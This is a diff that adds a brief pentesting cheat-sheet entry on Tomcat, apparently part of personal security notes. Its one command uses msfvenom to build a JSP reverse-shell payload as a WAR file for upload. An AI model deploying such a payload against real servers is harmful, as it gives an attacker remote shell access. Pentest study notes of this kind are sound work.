@@ -1,0 +1,10 @@
+#+title: Tomcat
+#+hugo_base_dir: /home/kdb/Documents/github/owlglass
+#+hugo_auto_set_lastmod: t
+#+options: H:2
+#+HUGO_SECTION: infosec/pentesting/web
+#+hugo_weight: 5
+
+* Tomcat
+** Uploading War File
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
